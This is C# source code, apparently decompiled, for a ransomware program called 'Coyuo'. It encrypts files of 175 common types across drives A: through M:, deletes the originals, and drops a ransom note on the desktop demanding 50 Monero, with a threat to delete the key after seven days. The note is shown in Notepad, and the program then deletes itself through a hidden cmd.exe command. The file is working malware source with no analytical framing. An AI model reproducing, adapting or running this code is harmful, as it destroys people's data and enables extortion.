using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace Crypt_it;

internal class Program
{
	public static string imha = "EVET";

	private static void Main(string[] args)
	{
		Crypt(new string[13]
		{
			"A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
			"K:\\", "L:\\", "M:\\"
		}, new string[175]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "1st", "alx", "asp", "log",
			"lrc", "lst", "md", "nfo", "opml", "plist", "reg", "rtf", "srt", "sub",
			"tbl", "xml", "xmp", "xsd", "xsl", "xslt", "accdb", "accdt", "doc", "docx",
			"docm", "dot", "dotx", "dotm", "mdb", "mpp", "mpt", "oft", "one", "onepkg",
			"pot", "potx", "pps", "ppsx", "ppt", "pptm", "pptx", "pst", "pub", "snp",
			"thmx", "vsd", "vsdx", "xls", "xlsm", "xlsx", "dat", "g64", "gb", "gba",
			"mbz", "n64", "nds", "nes", "rom", "smc", "smd", "srm", "v64", "ova",
			"ovf", "pvm", "vdi", "vhd", "vhdx", "vmdk", "vmem", "vmwarevm", "vmx", "bak",
			"bbb", "bkf", "bkp", "dbk", "gho", "ipd", "iso", "json", "mdbackup", "nba",
			"nbf", "nco", "nrg", "old", "rar", "sbf", "sbu", "spb", "spba", "tib",
			"wbcat", "zip", "gdb", "ofx", "qif", "tax", "csv", "db", "dbf", "fdb",
			"gdb", "idx", "mdb", "mdf", "sdf", "sql", "sqlite", "wdb", "xml", "abw",
			"aww", "cnt", "dbx", "djvu", "epub", "gp4", "ind", "indd", "key", "keynote",
			"mht", "ott", "oxps", "pages", "pmd", "prn", "prproj", "pwi", "sdd", "sdw",
			"shs", "snp", "tpl", "wpd", "wps", "wri", "xps", "bmp", "cpt", "dds",
			"dib", "dng", "emf", "heic", "ico", "icon", "pcx", "raw", "tga", "thm",
			"tif", "tiff", "wbmp", "wdp", "webp"
		}, "0B0VFXCIBNTKU525W5Z9WC6OHBLK8Y", ".coyuo");
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Instructions.txt.txt"))
		{
			streamWriter.WriteLine("=== IMPORTANT INFORMATION ===\r\n\r\nAll files and directories are encrypted!\r\nWe use a RSA-AES custom encryption routine!\r\n\r\nDont try any third-party software for the decryption-process!\r\n\r\nThis results in total damage of the data!\r\n\r\nSend 50 monero/xmr to this address:\r\n\r\n48qagEzsWN51HcwQsSeqYjdUH7ahCVCszPeqy5jWgVE54AmcbsKRqTmHRa4GjF39fsgyWK47ZekPs4tvHtHSyHctC84TSVt\r\n\r\nWhen the payment is confirmed, our support\r\nsend you a decryption-tool and the unique \r\nprivate-key to decrypt the data.\r\n\r\nGreetz \r\nyour Coyuo-Team\r\n\r\n=== NOTE!!! ===\r\nAFTER 7 DAYS WITHOUT A CONFIRMED\r\nPAYMENT,WE DELETE THE UNIQUE\r\nPRIVATE-KEY.YOU NEVER BE ABLE TO\r\nRESTORE THE FILES!!!\r\nID0720001");
		}
		Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Instructions.txt.txt");
		if (imha == "EVET")
		{
			imha_zamani();
		}
	}

	public static void imha_zamani()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetExecutingAssembly().Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void Crypt(string[] dizin, string[] uzantilar, string sifre, string crypt_uzantisi)
	{
		for (int i = 0; i < dizin.Length; i++)
		{
			for (int j = 0; j < uzantilar.Length; j++)
			{
				if (Directory.Exists(dizin[i]))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(dizin[i]);
					FileInfo[] files = directoryInfo.GetFiles("*." + uzantilar[j], SearchOption.AllDirectories);
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Encrypt(fileInfo.FullName, fileInfo.FullName + crypt_uzantisi, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
					}
				}
			}
		}
	}

	private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}
}
